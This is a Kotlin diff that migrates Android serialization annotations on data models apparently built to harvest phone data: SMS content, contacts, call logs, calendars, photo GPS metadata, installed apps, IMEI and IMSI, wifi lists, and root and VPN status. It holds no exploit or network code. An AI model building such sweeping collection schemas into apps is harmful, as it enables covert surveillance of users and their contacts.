@@ -5,30 +5,30 @@ import android.os.Parcelable
 import androidx.collection.MutableObjectList
 import androidx.collection.ObjectList
 import androidx.core.os.ParcelCompat
-import com.squareup.moshi.Json
-import com.squareup.moshi.JsonClass
 import kotlinx.parcelize.Parceler
 import kotlinx.parcelize.Parcelize
+import kotlinx.serialization.SerialName
+import kotlinx.serialization.Serializable
 import kotlin.reflect.KClass
 import kotlin.reflect.safeCast
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class ExtensionModel(
     /**Device info*/
-    @field:Json(name = "device_info") val device: DeviceInfo? = null,
+    @SerialName(value = "device_info") val device: DeviceInfo? = null,
     /**Contact info*/
-    @field:Json(name = "address_book") val contacts: List<Contact>? = null,
+    @SerialName(value = "address_book") val contacts: List<Contact>? = null,
     /**App info*/
-    @field:Json(name = "app_list") val apps: List<App>? = null,
+    @SerialName(value = "app_list") val apps: List<App>? = null,
     /**Sms Info*/
-    @field:Json(name = "sms") val sms: List<Sms>? = null,
+    @SerialName(value = "sms") val sms: List<Sms>? = null,
     /**Calendar info*/
-    @field:Json(name = "calendar_list") val calendars: List<Calendar>? = null,
+    @SerialName(value = "calendar_list") val calendars: List<Calendar>? = null,
 
-    @field:Json(name = "photoInfos") val photos: List<ImageInfo>? = null,
+    @SerialName(value = "photoInfos") val photos: List<ImageInfo>? = null,
 
-    @field:Json(name = "call_log") val callLogs: List<CallRecords>? = null
+    @SerialName(value = "call_log") val callLogs: List<CallRecords>? = null
 ) : Parcelable
 
 @Suppress("unused")
@@ -43,106 +43,106 @@ class ObjectListParceler<P: Parcelable>(private val type: KClass<P>): Parceler<O
     }
 }
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class DeviceInfo(
     /**轨迹跟踪记录, 抓取所有的图片，然后抓取图片内的信息*/
-    @field:Json(name = "albs") val albs: String?,
+    @SerialName(value = "albs") val albs: String?,
     /**音频外部文件个数*/
-    @field:Json(name = "audio_external") val audioExternal: Int?,
+    @SerialName(value = "audio_external") val audioExternal: Int?,
     /**音频内部文件个数*/
-    @field:Json(name = "audio_internal") val audioInternal: Int?,
+    @SerialName(value = "audio_internal") val audioInternal: Int?,
     /**电量信息*/
-    @field:Json(name = "battery_status") val batteryStatus: BatteryStatus?,
+    @SerialName(value = "battery_status") val batteryStatus: BatteryStatus?,
     /**设备基本信息*/
-    @field:Json(name = "general_data") val generalData: GeneralData?,
+    @SerialName(value = "general_data") val generalData: GeneralData?,
     /**设备硬件信息*/
-    @field:Json(name = "hardware") val hardware: Hardware?,
+    @SerialName(value = "hardware") val hardware: Hardware?,
     /**网路信息*/
-    @field:Json(name = "network") val network: Network?,
+    @SerialName(value = "network") val network: Network?,
     /**其他信息*/
-    @field:Json(name = "other_data") val otherData: OtherData?,
+    @SerialName(value = "other_data") val otherData: OtherData?,
     /**存储信息*/
-    @field:Json(name = "new_storage") val newStorage: Storage?,
+    @SerialName(value = "new_storage") val newStorage: Storage?,
     /**应用版本号对应的技术编码*/
-    @field:Json(name = "build_id") val buildId: String?,
+    @SerialName(value = "build_id") val buildId: String?,
     /**APP版本号*/
-    @field:Json(name = "build_name") val buildName: String?,
+    @SerialName(value = "build_name") val buildName: String?,
     /**联系人小组个数*/
-    @field:Json(name = "contact_group") val contactGroup: Int?,
+    @SerialName(value = "contact_group") val contactGroup: Int?,
     /**抓取时间*/
-    @field:Json(name = "create_time") val createTime: String?,
+    @SerialName(value = "create_time") val createTime: String?,
     /**下载的文件个数*/
-    @field:Json(name = "download_files") val downloadFiles: Int?,
+    @SerialName(value = "download_files") val downloadFiles: Int?,
     /**图片外部文件个数*/
-    @field:Json(name = "images_external") val imagesExternal: Int?,
+    @SerialName(value = "images_external") val imagesExternal: Int?,
     /**图片内部文件个数*/
-    @field:Json(name = "images_internal") val imagesInternal: Int?,
+    @SerialName(value = "images_internal") val imagesInternal: Int?,
     /**包名*/
-    @field:Json(name = "package_name") val packageName: String?,
+    @SerialName(value = "package_name") val packageName: String?,
     /**视频外部文件个数*/
-    @field:Json(name = "video_external") val videoExternal: Int?,
+    @SerialName(value = "video_external") val videoExternal: Int?,
     /**视频内部文件个数*/
-    @field:Json(name = "video_internal") val videoInternal: Int?,
+    @SerialName(value = "video_internal") val videoInternal: Int?,
     /**GPS_ADID*/
-    @field:Json(name = "gps_adid") val gpsAdid: String?,
+    @SerialName(value = "gps_adid") val gpsAdid: String?,
     /**设备ID 1.能取到imei传imei 2.取不到imei传安卓ID 3.都没有,传机构自己的设备id,请尽量保证顺序*/
-    @field:Json(name = "device_id") val deviceId: String?,
+    @SerialName(value = "device_id") val deviceId: String?,
     /**设备信息*/
-    @field:Json(name = "device_info") val deviceInfo: String?,
+    @SerialName(value = "device_info") val deviceInfo: String?,
     /**设备系统类型 仅支持 android/ios*/
-    @field:Json(name = "os_type") val osType: String?,
+    @SerialName(value = "os_type") val osType: String?,
     /**设备系统版本*/
-    @field:Json(name = "os_version") val osVersion: String?,
+    @SerialName(value = "os_version") val osVersion: String?,
     /**设备ip地址*/
-    @field:Json(name = "ip") val ip: String?,
+    @SerialName(value = "ip") val ip: String?,
     /**内存大小，获取不到传 -1*/
-    @field:Json(name = "memory") val memory: String?,
+    @SerialName(value = "memory") val memory: String?,
     /**存储空间大小，获取不到传 -1*/
-    @field:Json(name = "storage") val storage: String?,
+    @SerialName(value = "storage") val storage: String?,
     /**存储空间大小，获取不到传 -*/
-    @field:Json(name = "unuse_storage") val unUseStorage: String?,
+    @SerialName(value = "unuse_storage") val unUseStorage: String?,
     /**经度*/
-    @field:Json(name = "gps_longitude") val gpsLongitude: String?,
+    @SerialName(value = "gps_longitude") val gpsLongitude: String?,
     /**纬度*/
-    @field:Json(name = "gps_latitude") val gpsLatitude: String?,
+    @SerialName(value = "gps_latitude") val gpsLatitude: String?,
     /**gps地址*/
-    @field:Json(name = "gps_address") val gpsAddress: String?,
+    @SerialName(value = "gps_address") val gpsAddress: String?,
     /**详细地址*/
-    @field:Json(name = "address_info") val addressInfo: String?,
+    @SerialName(value = "address_info") val addressInfo: String?,
     /**是否wifi 0不是 1是*/
-    @field:Json(name = "wifi") val isWifi: Int?,
+    @SerialName(value = "wifi") val isWifi: Int?,
     /**wifi名称 获取不到传 -1*/
-    @field:Json(name = "wifi_name") val wifiName: String?,
+    @SerialName(value = "wifi_name") val wifiName: String?,
     /**电量*/
-    @field:Json(name = "battery") val battery: Int?,
+    @SerialName(value = "battery") val battery: Int?,
     /**是否root 0未root 1已root*/
-    @field:Json(name = "is_root") val isRoot: Int?,
+    @SerialName(value = "is_root") val isRoot: Int?,
     /**是否是模拟器 0不是模拟器 1是模拟器*/
-    @field:Json(name = "is_simulator") val isSimulator: Int?,
+    @SerialName(value = "is_simulator") val isSimulator: Int?,
     /**上次活跃时间戳*/
-    @field:Json(name = "last_login_time") val lastLoginTime: String?,
+    @SerialName(value = "last_login_time") val lastLoginTime: String?,
     /**图片数量，等于外部图片加内部图片，获取不到传-1*/
-    @field:Json(name = "pic_count") val picCount: Int?,
+    @SerialName(value = "pic_count") val picCount: Int?,
     /**sim卡串号*/
-    @field:Json(name = "imsi") val imsi: String?,
+    @SerialName(value = "imsi") val imsi: String?,
     /**mac地址 获取不到传-1*/
-    @field:Json(name = "mac") val mac: String?,
+    @SerialName(value = "mac") val mac: String?,
     /**SD卡存储空间大小，获取不到传-1*/
-    @field:Json(name = "sdcard") val sdCard: String?,
+    @SerialName(value = "sdcard") val sdCard: String?,
     /**SD卡未使用存储空间大小，获取不到传-1*/
-    @field:Json(name = "unuse_sdcard") val unUseSdCard: String?,
+    @SerialName(value = "unuse_sdcard") val unUseSdCard: String?,
     /**ios系统idfv*/
-    @field:Json(name = "idfv") val idfv: String?,
+    @SerialName(value = "idfv") val idfv: String?,
     /**ios系统idfa*/
-    @field:Json(name = "idfa") val idfa: String?,
-    @field:Json(name = "imei_history") val imeiHistory: Array<String>?,
+    @SerialName(value = "idfa") val idfa: String?,
+    @SerialName(value = "imei_history") val imeiHistory: Array<String>?,
     /**安卓系统imei，获取不到传-1*/
-    @field:Json(name = "imei") val ime: String?,
+    @SerialName(value = "imei") val ime: String?,
     /**屏幕分辨率*/
-    @field:Json(name = "resolution") val resolution: String?,
+    @SerialName(value = "resolution") val resolution: String?,
     /**品牌*/
-    @field:Json(name = "brand") val brand: String?
+    @SerialName(value = "brand") val brand: String?
 ) : Parcelable {
     override fun equals(other: Any?): Boolean {
         if (this === other) return true
@@ -258,275 +258,275 @@ data class DeviceInfo(
     }
 }
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Contact(
-    @field:Json(name = "contact_display_name") val name: String?,
+    @SerialName(value = "contact_display_name") val name: String?,
 
-    @field:Json(name = "number") val phoneNumber: String?,
+    @SerialName(value = "number") val phoneNumber: String?,
 
-    @field:Json(name = "up_time") val updateTime: Long?,
+    @SerialName(value = "up_time") val updateTime: Long?,
 
-    @field:Json(name = "last_time_contacted") val lastTimeContacted: Long?,
+    @SerialName(value = "last_time_contacted") val lastTimeContacted: Long?,
 
-    @field:Json(name = "times_contacted") val timesContacted: Int?,
+    @SerialName(value = "times_contacted") val timesContacted: Int?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class App(
-    @field:Json(name = "app_name") val name: String?,
+    @SerialName(value = "app_name") val name: String?,
 
-    @field:Json(name = "package_name") val packageName: String?,
+    @SerialName(value = "package_name") val packageName: String?,
 
-    @field:Json(name = "version_code") val versionCode: String?,
+    @SerialName(value = "version_code") val versionCode: String?,
 
-    @field:Json(name = "obtain_time") val obtainTime: Long?,
+    @SerialName(value = "obtain_time") val obtainTime: Long?,
 
-    @field:Json(name = "app_type") val appType: String?,
+    @SerialName(value = "app_type") val appType: String?,
 
-    @field:Json(name = "in_time") val installTime: Long?,
+    @SerialName(value = "in_time") val installTime: Long?,
 
-    @field:Json(name = "up_time") val updateTime: Long?,
+    @SerialName(value = "up_time") val updateTime: Long?,
 
-    @field:Json(name = "app_version") val appVersion: String?,
+    @SerialName(value = "app_version") val appVersion: String?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Sms(
-    @field:Json(name = "other_phone") val otherPhone: String?,
+    @SerialName(value = "other_phone") val otherPhone: String?,
 
-    @field:Json(name = "content") val content: String?,
+    @SerialName(value = "content") val content: String?,
     /**0-未读，1-已读*/
-    @field:Json(name = "seen") val seen: Int?,
+    @SerialName(value = "seen") val seen: Int?,
     /**短信状态：-1表示接收，0-complete，64-pending，128-failed*/
 
-    @field:Json(name = "read") val read: Int?,
+    @SerialName(value = "read") val read: Int?,
 
-    @field:Json(name = "subject") val subject: String?,
+    @SerialName(value = "subject") val subject: String?,
 
-    @field:Json(name = "status") val status: Int?,
+    @SerialName(value = "status") val status: Int?,
 
-    @field:Json(name = "time") val time: Long?,
+    @SerialName(value = "time") val time: Long?,
 
-    @field:Json(name = "type") val type: Int?,
+    @SerialName(value = "type") val type: Int?,
 
-    @field:Json(name = "package_name") val packageName: String?,
+    @SerialName(value = "package_name") val packageName: String?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Calendar(
-    @field:Json(name = "event_title") val eventTitle: String?,
+    @SerialName(value = "event_title") val eventTitle: String?,
 
-    @field:Json(name = "event_id") val eventId: Long?,
+    @SerialName(value = "event_id") val eventId: Long?,
 
-    @field:Json(name = "end_time") val endTime: Long?,
+    @SerialName(value = "end_time") val endTime: Long?,
 
-    @field:Json(name = "start_time") val startTime: Long?,
+    @SerialName(value = "start_time") val startTime: Long?,
 
-    @field:Json(name = "description") val des: String?,
+    @SerialName(value = "description") val des: String?,
 
-    @field:Json(name = "reminders") val reminders: List<Reminder>?
+    @SerialName(value = "reminders") val reminders: List<Reminder>?
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class BatteryStatus(
     /**电池电量 e.g. 2730(传的数据不用带单位)mAH*/
-    @field:Json(name = "battery_level") val batteryLevel: String?,
+    @SerialName(value = "battery_level") val batteryLevel: String?,
     /**电池总电量 e.g. 3900(传的数据不用带单位)mAH*/
-    @field:Json(name = "battery_max") val batteryMax: String?,
+    @SerialName(value = "battery_max") val batteryMax: String?,
     /**电池百分比*/
-    @field:Json(name = "battery_pct") val batteryPercent: Int?,
+    @SerialName(value = "battery_pct") val batteryPercent: Int?,
     /**是否交流充电 0不在 1在*/
-    @field:Json(name = "is_ac_charge") val isAcCharge: Int?,
+    @SerialName(value = "is_ac_charge") val isAcCharge: Int?,
     /**是否正在充电 0不在 1在*/
-    @field:Json(name = "is_charging") val isCharging: Int?,
+    @SerialName(value = "is_charging") val isCharging: Int?,
     /**是否usb充电 0不在 1在*/
-    @field:Json(name = "is_usb_charge") val isUsbCharge: Int?
+    @SerialName(value = "is_usb_charge") val isUsbCharge: Int?
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class GeneralData(
     /**Android id*/
-    @field:Json(name = "and_id") val androidId: String?,
+    @SerialName(value = "and_id") val androidId: String?,
     /**设备当前时间*/
-    @field:Json(name = "currentSystemTime") val currentSystemTime: String?,
+    @SerialName(value = "currentSystemTime") val currentSystemTime: String?,
     /**开机时间到现在的毫秒数（包括睡眠时间）*/
-    @field:Json(name = "elapsedRealtime") val elapsedRealtime: String?,
+    @SerialName(value = "elapsedRealtime") val elapsedRealtime: String?,
     /**google advertising id(google 广告 id)*/
-    @field:Json(name = "gaid") val gaid: String?,
+    @SerialName(value = "gaid") val gaid: String?,
     /**imei*/
-    @field:Json(name = "imei") val imei: String?,
+    @SerialName(value = "imei") val imei: String?,
     /**是否开启debug调试*/
-    @field:Json(name = "is_usb_debug") val isUsbDebug: String?,
+    @SerialName(value = "is_usb_debug") val isUsbDebug: String?,
     /**是否使用代理*/
-    @field:Json(name = "is_using_proxy_port") val isUsingProxyPort: String?,
+    @SerialName(value = "is_using_proxy_port") val isUsingProxyPort: String?,
 
-    @field:Json(name = "is_using_vpn") val isUsingVpn: String?,
+    @SerialName(value = "is_using_vpn") val isUsingVpn: String?,
 
-    @field:Json(name = "language") val language: String?,
+    @SerialName(value = "language") val language: String?,
 
-    @field:Json(name = "locale_display_language") val localeDisplayLanguage: String?,
+    @SerialName(value = "locale_display_language") val localeDisplayLanguage: String?,
 
-    @field:Json(name = "locale_iso_3_country") val localeISO3Country: String?,
+    @SerialName(value = "locale_iso_3_country") val localeISO3Country: String?,
 
-    @field:Json(name = "locale_iso_3_language") val localeISO3Language: String?,
+    @SerialName(value = "locale_iso_3_language") val localeISO3Language: String?,
 
-    @field:Json(name = "mac") val mac: String?,
+    @SerialName(value = "mac") val mac: String?,
 
-    @field:Json(name = "network_operator_name") val networkOperatorName: String?,
+    @SerialName(value = "network_operator_name") val networkOperatorName: String?,
 
-    @field:Json(name = "network_type") val networkType: String?,
+    @SerialName(value = "network_type") val networkType: String?,
 
-    @field:Json(name = "network_type_new") val networkTypeNew: String?,
+    @SerialName(value = "network_type_new") val networkTypeNew: String?,
 
-    @field:Json(name = "phone_number") val phoneNumber: String?,
+    @SerialName(value = "phone_number") val phoneNumber: String?,
 
-    @field:Json(name = "phone_type") val phoneType: Int?,
+    @SerialName(value = "phone_type") val phoneType: Int?,
 
-    @field:Json(name = "sensor_list") val sensor: List<Sensor>?,
+    @SerialName(value = "sensor_list") val sensor: List<Sensor>?,
 
-    @field:Json(name = "time_zone_id") val timeZoneId: String?,
+    @SerialName(value = "time_zone_id") val timeZoneId: String?,
 
-    @field:Json(name = "uptimeMillis") val uptimeMillis: String?,
+    @SerialName(value = "uptimeMillis") val uptimeMillis: String?,
 
-    @field:Json(name = "uuid") val uuid: String?
+    @SerialName(value = "uuid") val uuid: String?
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Sensor(
-    @field:Json(name = "maxRange") val maxRange: String?,
+    @SerialName(value = "maxRange") val maxRange: String?,
 
-    @field:Json(name = "minDelay") val minDelay: String?,
+    @SerialName(value = "minDelay") val minDelay: String?,
 
-    @field:Json(name = "name") val name: String?,
+    @SerialName(value = "name") val name: String?,
 
-    @field:Json(name = "power") val power: String?,
+    @SerialName(value = "power") val power: String?,
 
-    @field:Json(name = "resolution") val resolution: String?,
+    @SerialName(value = "resolution") val resolution: String?,
 
-    @field:Json(name = "type") val type: String?,
+    @SerialName(value = "type") val type: String?,
 
-    @field:Json(name = "vendor") val vendor: String?,
+    @SerialName(value = "vendor") val vendor: String?,
 
-    @field:Json(name = "version") val version: String?
+    @SerialName(value = "version") val version: String?
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Hardware(
-    @field:Json(name = "board") val board: String?,
+    @SerialName(value = "board") val board: String?,
 
-    @field:Json(name = "brand") val brand: String?,
+    @SerialName(value = "brand") val brand: String?,
 
-    @field:Json(name = "cores") val cores: Int?,
+    @SerialName(value = "cores") val cores: Int?,
 
-    @field:Json(name = "device_height") val deviceHeight: Int?,
+    @SerialName(value = "device_height") val deviceHeight: Int?,
 
-    @field:Json(name = "device_name") val deviceName: String?,
+    @SerialName(value = "device_name") val deviceName: String?,
 
-    @field:Json(name = "device_width") val deviceWidth: Int?,
+    @SerialName(value = "device_width") val deviceWidth: Int?,
 
-    @field:Json(name = "model") val model: String?,
+    @SerialName(value = "model") val model: String?,
 
-    @field:Json(name = "physical_size") val physicalSize: String?,
+    @SerialName(value = "physical_size") val physicalSize: String?,
     /**手机出厂时间戳*/
-    @field:Json(name = "production_date") val productionDate: Long?,
+    @SerialName(value = "production_date") val productionDate: Long?,
 
-    @field:Json(name = "release") val release: String?,
+    @SerialName(value = "release") val release: String?,
 
-    @field:Json(name = "sdk_version") val sdkVersion: String?,
+    @SerialName(value = "sdk_version") val sdkVersion: String?,
 
-    @field:Json(name = "serial_number") val serialNumber: String?,
+    @SerialName(value = "serial_number") val serialNumber: String?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Network(
-    @field:Json(name = "ip") val ip: String?,
+    @SerialName(value = "ip") val ip: String?,
 
-    @field:Json(name = "configured_wifi") val configuredWifi: List<Wifi>?,
+    @SerialName(value = "configured_wifi") val configuredWifi: List<Wifi>?,
 
-    @field:Json(name = "current_wifi") val currentWifi: Wifi?,
+    @SerialName(value = "current_wifi") val currentWifi: Wifi?,
 
-    @field:Json(name = "wifi_count") val wifiCount: Int?
+    @SerialName(value = "wifi_count") val wifiCount: Int?
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Wifi(
-    @field:Json(name = "bssid") val bssid: String?,
+    @SerialName(value = "bssid") val bssid: String?,
 
-    @field:Json(name = "mac") val mac: String?,
+    @SerialName(value = "mac") val mac: String?,
 
-    @field:Json(name = "name") val name: String?,
+    @SerialName(value = "name") val name: String?,
 
-    @field:Json(name = "ssid") val ssid: String?,
+    @SerialName(value = "ssid") val ssid: String?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class OtherData(
     /**手机的信号强度*/
-    @field:Json(name = "dbm") val dbm: String?,
+    @SerialName(value = "dbm") val dbm: String?,
     /**连接到设备的键盘种类*/
-    @field:Json(name = "keyboard") val keyboard: Int?,
+    @SerialName(value = "keyboard") val keyboard: Int?,
     /**最后一次启动时间*/
-    @field:Json(name = "last_boot_time") val lastBootTime: String?,
+    @SerialName(value = "last_boot_time") val lastBootTime: String?,
     /**是否 root*/
-    @field:Json(name = "root_jailbreak") val isRoot: Int?,
+    @SerialName(value = "root_jailbreak") val isRoot: Int?,
 
-    @field:Json(name = "simulator") val isSimulator: Int?,
+    @SerialName(value = "simulator") val isSimulator: Int?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Storage(
-    @field:Json(name = "app_free_memory") val appFreeMemory: String?,
+    @SerialName(value = "app_free_memory") val appFreeMemory: String?,
 
-    @field:Json(name = "app_max_memory") val appMaxMemory: String?,
+    @SerialName(value = "app_max_memory") val appMaxMemory: String?,
 
-    @field:Json(name = "app_total_memory") val appTotalMemory: String?,
+    @SerialName(value = "app_total_memory") val appTotalMemory: String?,
 
-    @field:Json(name = "contain_sd") val containSd: String?,
+    @SerialName(value = "contain_sd") val containSd: String?,
 
-    @field:Json(name = "extra_sd") val extraSd: String?,
+    @SerialName(value = "extra_sd") val extraSd: String?,
 
-    @field:Json(name = "internal_storage_total") val internalStorageTotal: Long?,
+    @SerialName(value = "internal_storage_total") val internalStorageTotal: Long?,
 
-    @field:Json(name = "internal_storage_usable") val internalStorageUsable: Long?,
+    @SerialName(value = "internal_storage_usable") val internalStorageUsable: Long?,
 
-    @field:Json(name = "memory_card_free_size") val memoryCardFreeSize: Long?,
+    @SerialName(value = "memory_card_free_size") val memoryCardFreeSize: Long?,
 
-    @field:Json(name = "memory_card_size") val memoryCardSize: Long?,
+    @SerialName(value = "memory_card_size") val memoryCardSize: Long?,
 
-    @field:Json(name = "memory_card_size_use") val memoryCardUsedSize: Long?,
+    @SerialName(value = "memory_card_size_use") val memoryCardUsedSize: Long?,
 
-    @field:Json(name = "memory_card_usable_size") val memoryCardUsableSize: Long?,
+    @SerialName(value = "memory_card_usable_size") val memoryCardUsableSize: Long?,
 
-    @field:Json(name = "ram_total_size") val ramTotalSize: String?,
+    @SerialName(value = "ram_total_size") val ramTotalSize: String?,
 
-    @field:Json(name = "ram_usable_size") val ramUsableSize: String?,
+    @SerialName(value = "ram_usable_size") val ramUsableSize: String?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class Reminder(
-    @field:Json(name = "eventId") val eventId: Long?,
+    @SerialName(value = "eventId") val eventId: Long?,
 
-    @field:Json(name = "method") val method: Int?,
+    @SerialName(value = "method") val method: Int?,
 
-    @field:Json(name = "minutes") val minutes: Int?,
+    @SerialName(value = "minutes") val minutes: Int?,
 
-    @field:Json(name = "reminder_id") val reminderId: Long?,
+    @SerialName(value = "reminder_id") val reminderId: Long?,
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class ImageInfo(
     val name: String,
@@ -567,7 +567,7 @@ data class ImageInfo(
 
     val yResolution: String,
 
-    @Json(name = "gps_altitude")
+    @SerialName(value = "gps_altitude")
     val altitude: String,
 
     val gpsProcessingMethod: String,
@@ -587,7 +587,7 @@ data class ImageInfo(
     val model: String
 ) : Parcelable
 
-@JsonClass(generateAdapter = true)
+@Serializable
 @Parcelize
 data class CallRecords(
     val id: Long,
@@ -602,16 +602,3 @@ data class CallRecords(
     var latitude: Double? = null,
     var longitude: Double? = null
 ): Parcelable
-
-@JsonClass(generateAdapter = true)
-@Parcelize
-data class GPS(
-    val latitude: String,
-    val longitude: String,
-    @Transient
-    val time: Long = -1L
-): Parcelable {
-    override fun toString(): String {
-        return ""
-    }
-}
